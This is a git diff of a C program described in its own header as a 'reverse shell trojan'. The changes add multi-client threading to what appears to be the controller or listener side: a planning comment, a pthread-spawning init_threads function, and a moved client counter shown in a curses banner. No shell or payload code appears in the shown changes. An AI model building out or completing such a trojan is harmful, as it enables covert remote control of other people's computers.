@@ -6,6 +6,17 @@
  * C reverse shell trojan
  * Do not use this for elegal purposes
  ****/
+ /*
+
+	-initialize the client threads
+	-in threads wait for numof clients
+	-if numof clients = threadnum
+	-open up threads
+	-store sockets in array of sockets (pointers)
+	-to change socket use signals
+	-mutex for socket variable and num of clients
+
+ */
 
 #include "papi.h"
 #include "papimain.h"
@@ -22,6 +33,9 @@ int main(int argc, char *argv[])
 	 *Initialize the variables and read program sys files
 	 **/
 	init_variables(&inf, argv);
+
+	init_threads(&inf, argv);
+
 	/*
 	 * Check current arguments and send them to the correct
 	 * Main function.
@@ -115,7 +129,6 @@ void init_variables(struct server_info * inf, char * argv[])
 	inf->server.sin_family = AF_INET;
 	inf->server.sin_addr.s_addr = INADDR_ANY;
 	inf->server.sin_port = htons( inf->portno );
-	inf->cliNum = 0;
 
 	if(inf->s == -1){
 		error("Can't init socket.", -1);
@@ -137,6 +150,16 @@ void init_variables(struct server_info * inf, char * argv[])
 	fclose(ipfile);
 	fclose(unamefile);
 
+}
+
+void init_threads(struct server_info * inf, char * argv[])
+{
+	for(int i = 0; i < NUMOCLIENTS; i++){
+		pthread_create(
+			 &serverThread.onConnect[i], NULL,
+			 connection_handler, (void *) i );
+
+	}
 }
 
 /*
@@ -183,7 +206,7 @@ void printlogo(struct server_info * inf)
     	mvprintw(2, 0, " | '_ \\_  _| '_ \\ |\n");
     	mvprintw(3, 0, " | .__/ |_|| .__/_|\n");
     	mvprintw(4, 0, " |_|       |_|\n");
-	mvprintw(2, (inf->win.col )/2, "[NumberOfClients: %d]", inf->cliNum);
+	mvprintw(2, (inf->win.col )/2, "[NumberOfClients: %d]", serverThread.cliNum);
 
 }
 
